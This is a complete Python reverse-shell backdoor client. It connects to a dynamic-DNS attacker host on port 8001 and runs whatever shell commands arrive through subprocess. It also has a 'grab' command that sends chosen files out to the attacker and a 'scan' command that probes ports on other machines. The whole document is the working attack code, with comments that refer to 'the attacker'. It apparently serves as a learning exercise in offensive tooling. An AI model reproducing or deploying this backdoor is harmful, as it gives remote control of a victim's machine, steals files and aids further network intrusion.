#!/usr/bin/python

import socket
import subprocess # CLI shell started on the system
import os

# transfer function
def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb') # read in binary mode
        packet = f.read(1024) # reading the sent file
        while packet != "":
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE')
        f.close()
    else:
        s.send('Unable to find out the file')

def scanner(s,ip,ports):
    scan_result = ''
    for port in ports.split(','): # ports will be comma separated
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # generating a TCP connection
            output = sock.connect_ex((ip, int(port))) # setting values
            # checking output
            if output == 0:
                scan_result = scan_result + "[+] Port: " + port + " is opened" + '\n' # concat message
            else:
                scan_result = scan_result + "[-] Port: " + port + " is closed or Hostname not found" + '\n' # concat message
            sock.close() # closing socket
        except Exception as e:
            pass
        # send commands to the attacker prompt
        s.send(scan_result)

def connect(ip):
   # AF_INET as a pair of (host,port) | SOCK_STREAM (default mode)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     # Attacker IP with the same port
    s.connect((ip, 8001))

    while True:
        command = s.recv(1024) # receiving communications
        if 'terminate' in command:
            s.close() # closing the socket if 'terminate'
            break
        elif 'grab' in command:
            # splitting information after the 'grab command'
            grab,path = command.split(" -f ")
            try:
                # sendting the path to the transfer sub-routine
                transfer(s,path)
            except Exception as e:
                s.send(str(e)) # sending error to the socket
        elif 'cd' in command:
            code, directory = command.split(" ") # spliting by space
            os.chdir(directory) # changing directory
            s.send("[+] CWD is now: " + os.getcwd()) # send message to attacker
        elif 'scan' in command:
            command = command[5:] # splitting the command from the full address
            ip,ports = command.split(":")
            scanner(s,ip,ports) # going to the scanner function
        else:
            # piping the stdout the the subprocess module using the Shell
            CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            # execution handling
            s.send(CMD.stdout.read()) # STDOUT
            s.send(CMD.stderr.read()) # STERR (return errors)

def main():
    # getting the DDNS server IP (DNS Lookup)
    ip = socket.gethostbyname('davidlares.ddns.net')
    connect(ip)
main()
